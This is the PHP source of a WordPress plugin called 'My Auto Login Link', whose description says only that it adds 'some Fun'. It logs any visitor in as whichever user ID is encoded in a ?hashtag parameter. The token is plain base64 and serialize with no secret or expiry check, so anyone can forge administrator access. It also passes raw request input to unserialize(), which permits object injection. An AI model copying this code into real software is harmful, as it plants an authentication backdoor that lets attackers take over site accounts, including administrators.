<?php
/**
 * Plugin Name: My Auto Login Link
 * Plugin URI: http://neowebsolution.com
 * Description: This plugin adds some Fun to your website
 * Version: 1.0.0
 * Author: Keshav Kalra
 */

function loginUserAutoKeshav(){

$user_id = makedecrypted($_GET['hashtag']) ;
//error_reporting(0);
	$scriptPath = dirname(__FILE__);
 $path = realpath($scriptPath . '/./');
 $filepath = explode("wp-content",$path);

if(!function_exists('wp_get_current_user')) {
    include(ABSPATH . "wp-includes/pluggable.php");
}

//define('WP_USE_THEMES', false);
//require(''.$filepath[0].'/wp-blog-header.php');


$user = get_user_by( 'id', $user_id );

if( $user ) {
    wp_set_current_user( $user_id, $user->user_login );
    wp_set_auth_cookie( $user_id );
    do_action( 'wp_login', $user->user_login );
echo "<script>location='/'</script>";
	}
	else{
echo "<script>alert('ah ah don't spam here!');</script>";
echo "<script>location='".get_site_url()."'</script>";
	}
}
///this is used for making the code not in not visible form

function makeencrypted($id){
		$id = json_encode(array('id'=>$id,'time'=>time()));
			$tagcode = base64_encode(serialize(base64_encode($id)));
			return $tagcode;
}


///this is used for making the function the code in formated as we need

function makedecrypted($id){

$tagcode = base64_decode(unserialize(base64_decode($id)));
$tagcode = json_decode($tagcode,true);
$tagcode = $tagcode['id'];

return $tagcode;
}

//if ( is_super_admin() ) {
add_action( 'admin_menu', 'register_my_custom_menu_page' );
//}
function register_my_custom_menu_page(){
	add_menu_page( 'Custom Login Link', 'Manage User Links', 'manage_options', 'customloginurl', 'my_custom_menu_page');
}

function my_custom_menu_page(){
	echo ' <div class="wrap">';
	echo "<h2>Admin Page Test</h2>";
	global $wpdb;
	$wp_user_search = $wpdb->get_results("
SELECT u.ID, u.display_name,GROUP_CONCAT(um.meta_value SEPARATOR ' ') as name
FROM $wpdb->users u
JOIN $wpdb->usermeta um ON um.user_id = u.ID
WHERE um.meta_key = 'first_name' or um.meta_key = 'last_name'
group by  u.ID
ORDER by um.meta_value
ASC ");
$wp_user_search = json_encode($wp_user_search);
$wp_user_search = json_decode($wp_user_search,true);
//print_r($wp_user_search);
echo '<table class="wp-list-table widefat fixed striped posts">';
echo "<thead><tr><th>Name</th> <th>Display Name</th> <th>Login Link</th></tr></thead>";
echo "<tbody>";



foreach($wp_user_search as $user){
$loginLink = get_site_url()."/?hashtag=".makeencrypted($user['ID']);
	echo "<tr><th>".$user['ID']." ".$user['name']."</th> <th>".$user['display_name']."</th> <th><input style='height:27px;' type=\"text\" value='".$loginLink."'></th></tr>";
}
echo "<tbody>";
echo "</table>";
echo '</div>';
}
if(isset($_GET['hashtag'])){
	loginUserAutoKeshav();
	exit();
}
///now time to save the

?>